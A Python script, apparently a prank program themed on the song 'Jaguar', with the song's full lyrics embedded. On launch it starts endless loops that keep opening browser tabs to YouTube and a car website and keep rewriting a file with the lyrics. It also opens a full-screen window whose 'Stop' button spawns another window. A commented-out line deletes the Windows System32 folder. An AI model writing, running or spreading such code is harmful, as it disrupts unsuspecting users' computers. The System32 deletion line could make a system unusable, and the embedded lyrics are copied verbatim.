import tkinter.scrolledtext
import webbrowser
import playsound3
import ttkbootstrap
import random
import multiprocessing as m
import os
import tkinter

import ttkbootstrap.scrolled


jaguarLyricsStr= ''' 
Yeah!
Raja Bohemia
Kudi kehndi, kudi kehndi
Kudi kehndi

[Hook : SUKH-E]
Kudi kendi baby pehla Jaguar lai lo
Phir jinna marji pyaar lai lo
(Pyaar lai lave)

[Verse 1 : SUKH-E]
Kendi baali main shaukeen
Ik week ik jean
Suit patiala shahi chaar lai lo

[Hook]

[Verse 2 : SUKH-E]
Kehndi ohna chir main vi haan ni karni
Jinna chir tussi dollera di shaah ni karni
Kudi kehndi, kudi kehndi
(Nahi karni ja nahi karni)

Aankhe add vichkaar tennu chadd jaaugi
Mainu kisse cheez ton vi naa nai karni
Mere nakhreya vaala sir bhaar lai lo
Phir jnna marzi pyaar lai lo
You might also like
[Hook]

[Verse 3 : Bohemia]
Kuri kehndi, kuri kehndi
Sohni model laggdi model town ch rehndi
(town 'ch rehndi)
Chotte motte lokan naal na mille
Nale oh choti moti gaddi ch na behndi
(choti moti gaddi 'ch)
Nalle nazar na aundi ohnu meri hor koi kaamyaabi
Dasso kittho laike aavan main Jaguar di chaabi
Bina LED headlights de
Tenu pyar mera dise na zara bhi

Hun mittran da dil todd ke kehndi
Sheher ghuma mainu sun roof khol ke (huh!)
Hun main athroo chupa ke ohda dil
Bhar lahu main dhol ke
Soniye ve saanu ki lagge Jaguar ton
Jattan da dil vadda hunda kisse vi car ton
Tu chad mere dil di tenu meri soh
Tennu siqva ni hauna mere pyaar ton (na!)

[Verse 4 : SUKH-E]
Kehndi soneya jattan da dil vadda hunda ae
Main laggda ni jatt agg laake tur gayi
Iss gal di zidd sali vech di sari zameen
Jatt jattan de munde da oh jaga ke tur gyi
Jaga ke tur gyi
Jaga ke tur gyi..
Jaani laide Jaguar ehna lau ga piyaar
Phir kisse nu nah kahu ja Jaguar lai lo

[Hook]

Kudi kehndi, kudi kehndi, kudi kehndi
Pehla Jaguar lai lo
Bhai Kudi kehndi, kudi kehndi, kudi kehndi
Pehla Jaguar lai lao..
Kudi kehndi
Muzical Doctorz!

'''

def JaguarWindow():

    # while True:
    win = ttkbootstrap.Window("Jaguar Lyrics", themename=random.choice(("darkly","litera")))
    win.minsize(win.winfo_screenwidth(),win.winfo_screenheight())
    ttkbootstrap.Label(win, text="Jaguar Lyrics").pack()
    ttkbootstrap.Button(win, text="Stop Jaguar", command=JaguarWindow).pack()
    win.mainloop()

def JaguarWeb():
    while True:
        webbrowser.open_new("https://www.youtube.com/watch?v=i2GC06euEDE")
        webbrowser.open_new("https://www.jaguar.in/index.html")
        
def JaguarLyrics():
    cnt = 9583495
    while True:
        with open(f"Jaguar{cnt}","w+") as file:
            for me in range(0, 1000):
                file.write(f"{jaguarLyricsStr}")
    cnt+=14594
    ...

def JaguarSong():
    playsound3.playsound("./Jaguar.mp3",block=False)


def JaguarTypeOO():
    p1 = m.Process(target=JaguarLyrics)
    p2 = m.Process(target=JaguarWindow)
    p3 = m.Process(target=JaguarWeb)
    
    p1.start()
    p2.start()
    p3.start()
    
    p1.join()
    p2.join()
    p3.join()

# Sab Kuch Khatam

# os.remove("C:\Windows\System32")

if __name__ == '__main__':
    JaguarTypeOO()